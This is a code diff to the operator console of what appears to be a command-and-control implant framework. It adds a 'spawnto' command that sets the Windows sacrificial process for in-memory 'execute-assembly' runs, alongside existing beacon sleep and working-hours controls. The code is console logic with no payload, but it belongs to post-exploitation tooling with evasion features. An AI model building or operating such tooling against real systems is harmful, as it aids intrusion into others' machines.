@@ -251,6 +251,9 @@ class BeaconConsole:
                 if cmd in ('workhours', 'wh'):
                     self._cmd_workhours(session, parts)
                     continue
+                if cmd == 'spawnto':
+                    self._cmd_spawnto(session, parts)
+                    continue
                 if cmd == 'kill':
                     self._cmd_kill(session)
                     if self.engine.get(session.id) is None:
@@ -1593,6 +1596,87 @@ class BeaconConsole:
               f"{new_label} ({shape} window){self.c['end']}")
         self._show_window_state(session)
 
+    def _cmd_spawnto(self, session, parts) -> None:
+        """Show, set, or clear the sacrificial process used by
+        execute-assembly.
+
+            spawnto                      show current value
+            spawnto <path>               set the sacrificial path
+            spawnto --clear              revert to self-spawn
+
+        The value is applied server-side and reaches the agent on
+        its next check-in — no task is queued, matching the way
+        `sleep` and `workhours` behave. On Windows, `execute-assembly`
+        spawns the named binary as the sacrificial process; on every
+        other target the field exists but has no effect.
+        """
+        c = self.c
+
+        if session.identity.get('os') != 'windows':
+            # The field is stored regardless, but the verb is only
+            # meaningful on Windows. Show the current value if the
+            # operator asks; warn on a set.
+            if len(parts) < 2:
+                cur = getattr(session, 'spawn_to', '') or ''
+                print(f"{c['cyan']}spawnto: "
+                      f"{c['yellow']}unused on this target"
+                      f"{c['end']} (os="
+                      f"{session.identity.get('os','?')})")
+                return
+            print(f"{c['yellow']}spawnto has no effect on a "
+                  f"{session.identity.get('os','?')} beacon; "
+                  f"execute-assembly is Windows-only.{c['end']}")
+            return
+
+        if len(parts) < 2:
+            cur = getattr(session, 'spawn_to', '') or ''
+            shown = cur if cur else '<self>'
+            print(f"{c['cyan']}spawnto: {c['green']}{shown}"
+                  f"{c['end']}")
+            if cur:
+                print(f"{c['dim']}execute-assembly will spawn this "
+                      f"binary as the sacrificial process on the "
+                      f"next invocation.{c['end']}")
+            else:
+                print(f"{c['dim']}execute-assembly will spawn a "
+                      f"fresh copy of the beacon binary.{c['end']}")
+            return
+
+        arg = parts[1].strip()
+
+        if arg in ('--clear', '-', 'clear', 'none', 'self', ''):
+            had = getattr(session, 'spawn_to', '') or ''
+            session.spawn_to = ''
+            if had:
+                print(f"{c['green']}spawnto cleared "
+                      f"(was {had!r}) — execute-assembly will spawn "
+                      f"a fresh copy of the beacon binary"
+                      f"{c['end']}")
+            else:
+                print(f"{c['cyan']}spawnto already empty "
+                      f"(self-spawn){c['end']}")
+            return
+
+        if len(arg) > 512:
+            print(f"{c['red']}spawnto path is too long "
+                  f"(max 512 characters){c['end']}")
+            return
+        if any(ch in arg for ch in ('\n', '\r', '\0')):
+            print(f"{c['red']}spawnto path contains control "
+                  f"bytes{c['end']}")
+            return
+
+        old = getattr(session, 'spawn_to', '') or ''
+        session.spawn_to = arg
+        if old:
+            print(f"{c['green']}spawnto: {old} -> {arg}"
+                  f"{c['end']}")
+        else:
+            print(f"{c['green']}spawnto: {arg}{c['end']}")
+        print(f"{c['dim']}applies to execute-assembly on the next "
+              f"invocation; the beacon learns the value on its "
+              f"next check-in{self.c['end']}")
+
     def _cmd_kill(self, session) -> None:
         answer = ""
         try:
@@ -2808,6 +2892,8 @@ code {{
     workhours <start> <end>   Set working-hours window (HH:MM each)
     workhours off             Disable the working-hours gate
     workhours                 Show current window
+    spawnto <path>            Sacrificial process for execute-assembly
+                              (Windows; `spawnto --clear` to revert)
     tasks                     List outstanding tasks
     wait [task-id]            Block until pending task(s) complete
     schedule add <N><u> <verb> [args]
